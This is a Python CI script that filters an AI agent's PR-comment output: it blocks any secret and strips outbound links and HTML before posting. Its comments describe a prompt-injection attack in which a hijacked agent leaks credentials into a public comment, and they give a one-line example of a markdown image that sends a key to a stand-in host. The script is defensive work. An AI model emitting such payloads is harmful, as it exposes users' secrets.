#!/usr/bin/env python3
# M4 (ADR-0005) — deterministic, LLM-free, fail-closed output post-processor.
#
# Runs on the rendered PUBLIC body (the text bound for a PR comment / job
# summary) AFTER render-stage-comment.py and BEFORE any posting step:
#
#   1. Secret scan  -> FAIL the stage (exit 1) on any hit. Nothing is posted.
#      This is the control that actually stops "Comment and Control" (a
#      prompt-injected agent emitting a credential into a public comment).
#   2. URL / HTML neutralize -> strip outbound-exfil vectors (zero-click
#      markdown images, non-allowlisted links, dangerous HTML tags) and emit
#      the scrubbed body for the posting steps to consume.
#
# Schema validation of stage-output.json happens upstream in the renderer;
# this gate guards the rendered surface, not the artifact shape. It is
# intentionally LLM-free and dependency-free (stdlib only) so it is
# deterministic and auditable.
#
# I/O: reads the candidate body from env BODY (falls back to stdin). On pass,
# writes the scrubbed body to GITHUB_OUTPUT as `comment`. Exit 1 = fail-closed.

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from sdlc_scrub import neutralize_html_links, secret_hits  # noqa: E402


def notice(m):
    sys.stderr.write(f"::notice::{m}\n")


def err(m):
    sys.stderr.write(f"::error::{m}\n")


body = os.environ.get("BODY")
if body is None:
    body = sys.stdin.read()

# --- 1. Secret scan (named patterns + high-entropy backstop) ---------------
# Scanned on the RAW body first, so a secret hidden in a URL query
# (e.g. ![](http://x/?d=sk-ant-…)) is caught before the URL is neutralized.
hits = secret_hits(body)

if hits:
    err(
        f"M4 secret scan: output contains likely secret(s) {sorted(set(hits))}. "
        "Output BLOCKED — nothing posted to the PR or job summary. This is the "
        "fail-closed control against prompt-injection credential exfiltration "
        "('Comment and Control'). Inspect the run artifact (not the log) to triage."
    )
    sys.exit(1)

# --- 2. URL / HTML neutralize ----------------------------------------------
scrubbed = neutralize_html_links(body)

# --- emit ------------------------------------------------------------------
out_path = os.environ.get("GITHUB_OUTPUT")
if out_path:
    with open(out_path, "a") as f:
        f.write("comment<<__SDLC_M4_EOF__\n")
        f.write(scrubbed if scrubbed.endswith("\n") else scrubbed + "\n")
        f.write("__SDLC_M4_EOF__\n")
else:
    sys.stdout.write(scrubbed)

notice(f"M4 output filter passed: no secrets; URLs/HTML neutralized "
       f"({len(body)} -> {len(scrubbed)} chars).")